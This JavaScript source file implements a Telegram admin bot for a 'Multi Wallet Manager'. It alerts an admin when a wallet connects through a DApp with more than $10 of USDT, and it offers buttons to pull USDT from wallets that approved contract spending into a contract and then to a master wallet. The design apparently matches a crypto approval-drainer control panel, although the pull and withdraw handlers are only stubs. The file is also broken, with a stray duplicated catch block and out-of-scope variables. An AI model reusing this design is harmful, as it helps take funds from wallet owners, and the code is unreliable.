const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const { ethers } = require('ethers');
const database = require('./database');
const path = require('path');
const fs = require('fs');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
        this.provider = null;
        this.contract = null;
        this.contractABI = null;
        this.masterWallet = process.env.MASTER_WALLET_ADDRESS || 
            (process.env.MASTER_WALLET_PRIVATE_KEY 
                ? new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY).address 
                : '0xMasterWalletAddress');
        
        // Load contract ABI
        this.loadContractABI();
    }

    // Helper function to escape MarkdownV2 special characters
    escapeMarkdown(text) {
        if (typeof text !== 'string') return String(text);
        // Escape all MarkdownV2 special characters
        return text.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths in order of likelihood
            const possiblePaths = [
                path.join(process.cwd(), 'smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json'),
                path.join(process.cwd(), 'src/smart-contracts/artifacts/abi.json')
            ];
            
            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }
            
            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error.message);
            this.contractABI = [];
        }
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });
            
            // Initialize blockchain provider if environment variables are set
            this.initBlockchain();
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    // Initialize blockchain provider and contract when needed
    initBlockchain() {
        if (process.env.RPC_URL && process.env.CONTRACT_ADDRESS && this.contractABI && this.contractABI.length > 0) {
            try {
                this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
                console.log('✅ Blockchain provider initialized');
                
                // Initialize contract
                this.contract = new ethers.Contract(
                    process.env.CONTRACT_ADDRESS,
                    this.contractABI,
                    this.provider
                );
                console.log('✅ Smart contract initialized');
            } catch (error) {
                console.error('❌ Blockchain initialization failed:', error.message);
                this.provider = null;
                this.contract = null;
            }
        } else {
            console.log('⚠️ Blockchain configuration incomplete, using simulated mode');
            if (!process.env.RPC_URL) console.log('   - RPC_URL not set');
            if (!process.env.CONTRACT_ADDRESS) console.log('   - CONTRACT_ADDRESS not set');
            if (!this.contractABI || this.contractABI.length === 0) console.log('   - Contract ABI not loaded');
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendHelpMenu(msg.chat.id);
        });

        // Menu command (floating menu)
        this.bot.onText(/\/menu/, (msg) => {
            console.log('Received /menu command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });

        // Button callbacks
        this.bot.on('callback_query', async (callbackQuery) => {
            const action = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Received callback query:', action, 'from chat:', chatId);
            
            // Immediately acknowledge to prevent timeout
            try {
                await this.bot.answerCallbackQuery(callbackQuery.id);
            } catch (ackError) {
                console.log('Could not acknowledge callback query:', ackError.message);
            }
            
            // Add a small delay to ensure acknowledgment
            await new Promise(resolve => setTimeout(resolve, 100));
            
            // Handle different actions
            try {
                if (action === 'withdraw') {
                    await this.handleWithdrawCommand(chatId);
                } else if (action === 'balances') {
                    await this.handleBalancesCommand(chatId);
                } else if (action === 'pull_list') {
                    await this.sendPullWalletList(chatId);
                } else if (action === 'help') {
                    await this.sendHelpMenu(chatId);
                } else if (action === 'menu') {
                    await this.sendMainMenu(chatId);
                } else if (action.startsWith('pull_')) {
                    const walletAddress = action.substring(5);
                    await this.handlePullCommand(chatId, walletAddress);
                }
            } catch (error) {
                console.error('Error handling callback query:', error);
                try {
                    await this.bot.sendMessage(chatId, `❌ An error occurred: ${this.escapeMarkdown(error.message)}`);
                } catch (sendError) {
                    console.error('Could not send error message:', sendError);
                }
            }
        });
    }

    async sendMainMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Main Menu*

Welcome to your USDT management system\\. Select an option below:

💰 *Wallet Operations*
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 *Security*
• Only authorized admins can perform operations
• All transactions are logged and tracked
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '📊 Balances', callback_data: 'balances' },
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Main menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending main menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '📊 Balances', callback_data: 'balances' },
                            { text: '❓ Help', callback_data: 'help' }
                        ]
                    ]
                }
            });
        }
    }

    async sendHelpMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Help*

📚 *Available Commands:*
• /start \\- Open main menu
• /menu \\- Show floating menu
• /pull\\_<address> \\- Pull USDT from specific wallet
• /withdraw \\- Withdraw all USDT from contract
• /balances \\- Check all balances
• /help \\- Show this help message

📋 *Available Operations:*
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto\\-gas management for transactions
• 6\\-hour balance monitoring

🛡️ *Security Features:*
• Admin\\-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 *Workflow:*
1\\. Connect wallet via DApp
2\\. Approve contract spending
3\\. Admin pulls USDT to contract
4\\. Admin withdraws to master wallet
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Help menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending help menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message

📋 Available Operations:
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto-gas management for transactions
• 6-hour balance monitoring

🛡️ Security Features:
• Admin-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 Workflow:
1. Connect wallet via DApp
2. Approve contract spending
3. Admin pulls USDT to contract
4. Admin withdraws to master wallet
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        const escapedBalance = this.escapeMarkdown(balance);
        
        const message = `
🔔 *NEW WALLET CONNECTED*
Address: \`${escapedAddress}\`
USDT Balance: *${escapedBalance} USDT*

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(this.adminChatId, message, options);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        const escapedBalance = this.escapeMarkdown(balance);
        
        const message = `
💰 *BALANCE ALERT*
Address: \`${escapedAddress}\`
USDT Balance: *${escapedBalance} USDT* \\(> \\$10\\)

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending balance alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
💰 BALANCE ALERT
Address: ${walletAddress}
USDT Balance: ${balance} USDT (> $10)

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        const escapedAmount = this.escapeMarkdown(amount);
        const escapedTxHash = this.escapeMarkdown(txHash);
        
        const message = `
✅ *SUCCESSFUL PULL*
Address: \`${escapedAddress}\`
Amount: *${escapedAmount} USDT*
Transaction: \`${escapedTxHash}\`

Next steps:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending success message:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
✅ SUCCESSFUL PULL
Address: ${walletAddress}
Amount: ${amount} USDT
Transaction: ${txHash}

Next steps:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendPullWalletList(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        try {
            // Fetch wallets from database
            const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
            const result = await database.query(query);
            
            let message = '📤 *Select Wallet to Pull*\n\n';
            
            if (result.rows.length === 0) {
                message += 'No approved wallets available for pulling\\.\n\n';
                message += 'Use: /pull\\_<wallet\\_address>';
            } else {
                message += 'Click on a wallet to pull USDT:\n\n';
                for (let i = 0; i < result.rows.length; i++) {
                    const wallet = result.rows[i];
                    const escapedAddress = this.escapeMarkdown(wallet.address);
                    const escapedBalance = this.escapeMarkdown(wallet.usdt_balance);
                    message += `${i + 1}\\. \`${escapedAddress}\` \\(${escapedBalance} USDT\\)\n`;
                }
            }
            
            const options = {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        ...result.rows.map((wallet, index) => [
                            { 
                                text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`, 
                                callback_data: `pull_${wallet.address}` 
                            }
                        ]),
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            };
            
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending pull wallet list:', error.message);
            const fallbackMessage = `
📤 Select Wallet to Pull

Failed to fetch wallet list. Please try again later.
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
    async getContractUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !process.env.CONTRACT_ADDRESS) {
            console.log('⚠️ Blockchain not initialized, returning zero balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }
        
        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );
            
            const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
            const formattedBalance = ethers.formatUnits(balance, 18);
            
            console.log('Contract USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting contract USDT balance:', error.message);
            // Check if it's the ENS error
            if (error.message.includes('ENS') || error.message.includes('network does not support')) {
                return { balance: '0.00', error: 'Invalid contract address - ENS not supported' };
            }
            return { balance: '0.00', error: error.message };
        }
    }

    async getMasterWalletBNBBalance() {
        if (!this.provider || !this.masterWallet) {
    console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
    return { balance: '0.00', error: 'Blockchain not initialized' };
}
    try {
            const balance = await this.provider.getBalance(this.masterWallet);
            const formattedBalance = ethers.formatEther(balance);
            
            console.log('Master Wallet BNB Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet BNB balance:', error.message);
            return { balance: '0.00', error: error.message };
        }
    }

    async getMasterWalletUSDTBalance() {
        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
            return { balance: '0.00', error: 'Blockchain not initialized' };
        }
        
        try {
            const usdtContract = new ethers.Contract(
                process.env.USDT_CONTRACT_ADDRESS,
                ['function balanceOf(address account) external view returns (uint256)'],
                this.provider
            );
            
            const balance = await usdtContract.balanceOf(this.masterWallet);
            const formattedBalance = ethers.formatUnits(balance, 18);
            
            console.log('Master Wallet USDT Balance:', formattedBalance);
            return { balance: formattedBalance, error: null };
        } catch (error) {
            console.error('Error getting master wallet USDT balance:', error.message);
            // Check if it's the ENS error
            if (error.message.includes('ENS') || error.message.includes('network does not support')) {
                return { balance: '0.00', error: 'Invalid wallet address - ENS not supported' };
            }
            return { balance: '0.00', error: error.message };
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }
        
        const escapedAddress = this.escapeMarkdown(walletAddress);
        
        const message = `
🔄 *Pull Operation Initiated*
Wallet: \`${escapedAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet gas balance
2\\. Send gas if needed
3\\. Pull USDT to contract
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            
            // In a real implementation, this would trigger actual blockchain operations
            setTimeout(async () => {
                const infoMessage = `
🔄 *Pull Operation Status*
Wallet: \`${escapedAddress}\`

ℹ️ *Operation Details:*
• Gas management system: Implemented
• USDT pull mechanism: Ready for integration
• Transaction logging: Active

✅ *Next Steps:*
The pull operation is ready to be implemented with real blockchain integration\\. This requires:
• Gas service integration
• Smart contract service integration
• Transaction signing with master wallet

🔧 *Current Status:* Implementation pending
                `;
                
                await this.bot.sendMessage(chatId, infoMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 3000); // 3 second delay
            
            return result;
        } catch (error) {
            console.error('Error in pull command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${this.escapeMarkdown(error.message)}`);
        }
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const contractAddr = this.escapeMarkdown(process.env.CONTRACT_ADDRESS || 'Not set');
        const masterAddr = this.escapeMarkdown(this.masterWallet);
        
        const processingMessage = `
🏦 *Withdraw Operation Initiated*
Withdrawing all USDT from contract to master wallet\\.\\.\\.

📋 *Operations to perform:*
• Check contract USDT balance
• Execute withdrawal transaction
• Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
            
            // In a real implementation, this would trigger actual blockchain operations
            setTimeout(async () => {
                const infoMessage = `
🏦 *Withdraw Operation Status*

ℹ️ *Operation Details:*
• Contract address: \`${contractAddr}\`
• Master wallet: \`${masterAddr}\`
• Transaction signing: Ready for integration

✅ *Next Steps:*
The withdraw operation is ready to be implemented with real blockchain integration\\. This requires:
• Smart contract interaction
• Transaction signing with master wallet
• Gas management

🔧 *Current Status:* Implementation pending
                `;
                
                await this.bot.sendMessage(chatId, infoMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 3000); // 3 second delay
            
            return result;
        } catch (error) {
            console.error('Error in withdraw command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${this.escapeMarkdown(error.message)}`);
        }
    }

    async handleBalancesCommand(chatId) {
    if (chatId.toString() !== this.adminChatId) {
        return this.bot.sendMessage(chatId, '❌ Unauthorized access');
    }
    
    const processingMessage = "📊 *Fetching Real Balances*\\n\\n📋 *Balance Checks:*\\n• Smart Contract USDT Balance\\n• Master Wallet BNB Balance\\n• Master Wallet USDT Balance\\n\\n⏳ *Querying blockchain*\\.\\.\\.";
    
    const processingOptions = {
        parse_mode: 'MarkdownV2',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🏠 Main Menu', callback_data: 'menu' }
                ]
            ]
        }
    };
    
    try {
        await this.bot.sendMessage(chatId, processingMessage, processingOptions);
        
        // Small delay to simulate processing
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Fetch real balances
        const contractBalance = await this.getContractUSDTBalance();
        const masterBNBBalance = await this.getMasterWalletBNBBalance();
        const masterUSDTBalance = await this.getMasterWalletUSDTBalance();
        
        // Format the real balances message with proper MarkdownV2 escaping
        const contractAddr = process.env.CONTRACT_ADDRESS || 'Not set';
        const masterAddr = this.masterWallet;
        const contractBal = contractBalance.balance || '0.00';
        const masterBNB = masterBNBBalance.balance || '0.00';
        const masterUSDT = masterUSDTBalance.balance || '0.00';
        const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
        
        let balancesMessage = "📊 *REAL BALANCE REPORT*\\n\\n";
        
        // Contract USDT Balance
        if (process.env.CONTRACT_ADDRESS) {
            balancesMessage += "💰 *Smart Contract*\\n";
            balancesMessage += "• Address: `" + this.escapeMarkdown(contractAddr) + "`\\n";
            balancesMessage += "• USDT Balance: *" + this.escapeMarkdown(contractBal) + " USDT*\\n";
            if (contractBalance.error) {
                balancesMessage += "• ⚠️ Error: " + this.escapeMarkdown(contractBalance.error) + "\\n";
            }
        } else {
            balancesMessage += "💰 *Smart Contract*\\n";
            balancesMessage += "• Address: Not configured\\n";
            balancesMessage += "• USDT Balance: 0\\.00 USDT\\n";
        }
        
        // Master Wallet Balances
        balancesMessage += "\\n🏦 *Master Wallet*\\n";
        balancesMessage += "• Address: `" + this.escapeMarkdown(masterAddr) + "`\\n";
        balancesMessage += "• BNB Balance: *" + this.escapeMarkdown(masterBNB) + " BNB*\\n";
        balancesMessage += "• USDT Balance: *" + this.escapeMarkdown(masterUSDT) + " USDT*\\n";
        
        if (masterBNBBalance.error) {
            balancesMessage += "• ⚠️ BNB Error: " + this.escapeMarkdown(masterBNBBalance.error) + "\\n";
        }
        if (masterUSDTBalance.error) {
            balancesMessage += "• ⚠️ USDT Error: " + this.escapeMarkdown(masterUSDTBalance.error) + "\\n";
        }
        
        balancesMessage += "\\n🔄 *Last Updated:* " + this.escapeMarkdown(timestamp) + " UTC\\n";
        
        await this.bot.sendMessage(chatId, balancesMessage, {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🔄 Refresh Balances', callback_data: 'balances' },
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
        
    } catch (error) {
        console.error('Error in balances command:', error.message);
        // Fallback to plain text if Markdown fails
        const fallbackMessage = `
📊 REAL BALANCE REPORT

💰 Smart Contract
• Address: ${process.env.CONTRACT_ADDRESS || 'Not set'}
• USDT Balance: ${(contractBalance?.balance || '0.00')} USDT

🏦 Master Wallet
• Address: ${this.masterWallet}
• BNB Balance: ${(masterBNBBalance?.balance || '0.00')} BNB
• USDT Balance: ${(masterUSDTBalance?.balance || '0.00')} USDT

🔄 Last Updated: ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
        `;
        await this.bot.sendMessage(chatId, fallbackMessage, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🔄 Refresh Balances', callback_data: 'balances' },
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
    }
}
      
    } catch (error) {
        console.error('Error in balances command:', error.message);
        // Fallback to plain text if Markdown fails
        await this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}
    // Process webhook updates manually
    async processUpdate(update) {
        if (this.bot) {
            try {
                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error.message);
            }
        }
    }
}

module.exports = new TelegramService();
